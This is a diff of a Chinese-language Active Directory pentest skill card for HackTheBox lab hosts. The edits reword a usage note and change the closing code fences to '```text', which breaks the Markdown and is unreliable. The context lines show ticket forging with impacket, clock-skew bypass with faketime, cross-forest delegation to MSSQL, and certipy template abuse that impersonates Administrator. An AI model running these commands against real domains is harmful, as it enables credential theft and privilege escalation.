@@ -4,7 +4,7 @@ description: 'Kerberos-Only / No-NTLM AD 范式：AES256-only、时钟偏差、�
 disable-model-invocation: true
 metadata: { domain: ad-win, tier: T2 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+> 📌 DSH 用法：按卡名用 skill 工具加载；长任务用 bash 后台任务、并行侦察用 subagent。
 
 # Kerberos-Only / No-NTLM AD 范式
 
@@ -24,7 +24,7 @@ nxc smb dc01.ping.htb -k --use-kcache                       # ✅ 成功
 
 # 信号3：RC4 被禁（PONG.HTB）
 impacket-getTGT -aesKey <aes256> pong.htb/user   # 必须用 AES256
-```
+```text
 
 ## 强制 Kerberos 工具链（无 NTLM fallback）
 
@@ -47,7 +47,7 @@ nxc smb dc -k --use-kcache
 # AES256-only 环境
 impacket-getTGT domain/user -hashes :<NT> -aesKey <aes256>
 impacket-getST -spn 'svc/host' -k -no-pass -aesKey <aes256>
-```
+```text
 
 ## 时钟偏差 — #1 无声杀手
 
@@ -65,7 +65,7 @@ faketime "$(date -d @$(rdate -p dc1.ping.htb | cut -d. -f1))" impacket-getST ...
 
 # 检查偏差
 sudo ntpdate -qu dc1.ping.htb
-```
+```text
 
 ## 跨林委派 + Trust
 
@@ -86,7 +86,7 @@ impacket-getST -spn 'MSSQLSvc/dc2.pong.htb:1433' \
 
 # 跨林 referral TGT 会自动生成
 # ST 到达 PONG.HTB → 可执行远程命令
-```
+```text
 
 ## 跨林后的回归路径（PingPong 特色）
 
@@ -101,7 +101,7 @@ certipy req -u svc@ping.htb -hashes :<NT> \
   -ca PING-CA -template VulnTemplate \
   -upn Administrator@ping.htb -dc-ip dc1.ping.htb
 certipy auth -pfx administrator.pfx -dc-ip dc1.ping.htb
-```
+```text
 
 ## 工具兼容性表
 
